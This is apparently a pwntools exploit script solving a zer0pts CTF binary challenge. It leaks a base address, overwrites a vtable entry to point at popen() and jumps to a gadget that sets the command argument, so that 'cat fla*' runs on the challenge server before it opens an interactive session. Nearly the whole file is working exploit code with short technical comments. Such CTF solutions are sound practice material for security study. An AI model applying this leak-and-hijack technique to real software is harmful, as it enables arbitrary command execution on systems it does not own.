#!/usr/bin/env python3
from pwn import *

# https://gist.github.com/dfyz/bfdb800fec01bb5f8b4be51dc54a600d

context.terminal = ['tmux', 'sp', '-h']

def connect():
    if args.REMOTE:
        return remote('pwn1.ctf.zer0pts.com', 9002)
    return process('./chall')


with connect() as tube:
    tube.sendlineafter(b'> ', b'2')
    tube.sendlineafter(b': ', b'lol')

    leak = tube.recvuntil(b']\n')
    start_pos = leak.find(b'0x')
    end_pos = leak.find(b']', start_pos)
    base_addr = int(leak[start_pos:end_pos], 16) - 0xa1e5d

    info(hex(base_addr))

    tube.sendlineafter(b'> ', b'1')
    tube.sendlineafter(b': ', b'lol')
    tube.sendlineafter(b': ', b'3')
    for _ in range(3):
        tube.sendlineafter(b' = ', b'(0, 0)')

    tube.sendlineafter(b'> ', b'3')
    tube.sendlineafter(b': ', b'lol')
    tube.sendlineafter(b': ', b'lol')
    tube.sendlineafter(b': ', b'n')

    def to_tuple(payload):
        hi = u32(payload[0:4], sign='signed')
        lo = u32(payload[4:], sign='signed')
        return f'({hi}, {lo})'.encode()

    def write(addr, val):
        assert addr % 8 == 0
        tube.sendlineafter(b'> ', b'4')
        tube.sendlineafter(b': ', b'lol')
        tube.sendlineafter(b': ', str(addr // 8).encode())
        
        tube.sendlineafter(b' = ', to_tuple(val))

    # a vtable entry that points to popen()
    write(base_addr + 0x1681c0, p64(base_addr + 0xdd0b0))
    info(hex(base_addr + 0x1681c0) + ' <-- ' + hex(base_addr + 0xdd0b0))
    # MADNESS AHEAD
    # $rsi is the pointer to the length of the name of the polygon.
    # We don't control rdibutwecontrolr12, which points to the last tuple
    # of the polygon. We can therefore jump into the middle of a function that
    # does `mov rdi, r12`. This is enough to call popen(PAYLOAD, "w").
    write(base_addr + 0x150988, p64(base_addr + 0xe5e10))
    info(hex(base_addr + 0x150988) + ' <-- ' + hex(base_addr + 0xe5e10))
    #gdb.attach(tube, 'pie breakpoint 0xa1010\nc')

    tube.sendlineafter(b'> ', b'1')
    tube.sendlineafter(b': ', b'A' * ord('w'))
    tube.sendlineafter(b': ', b'3')
    for _ in range(3):
        tube.sendlineafter(b' = ', to_tuple(b'cat fla*'))

    tube.interactive()
